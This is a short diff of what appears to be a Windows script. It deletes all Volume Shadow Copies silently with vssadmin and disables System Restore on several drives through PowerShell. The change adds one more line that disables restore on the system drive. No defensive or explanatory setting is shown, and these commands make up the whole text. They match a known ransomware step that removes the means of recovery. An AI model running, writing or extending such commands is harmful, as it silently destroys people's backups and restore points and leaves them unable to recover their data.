@@ -1,6 +1,7 @@
 
 vssadmin Delete Shadows /All /Quiet
 
+powershell -Command "Disable-ComputerRestore -Drive %SystemDrive%"
 powershell -Command "Disable-ComputerRestore -Drive C:"
 powershell -Command "Disable-ComputerRestore -Drive D:"
 powershell -Command "Disable-ComputerRestore -Drive E:"
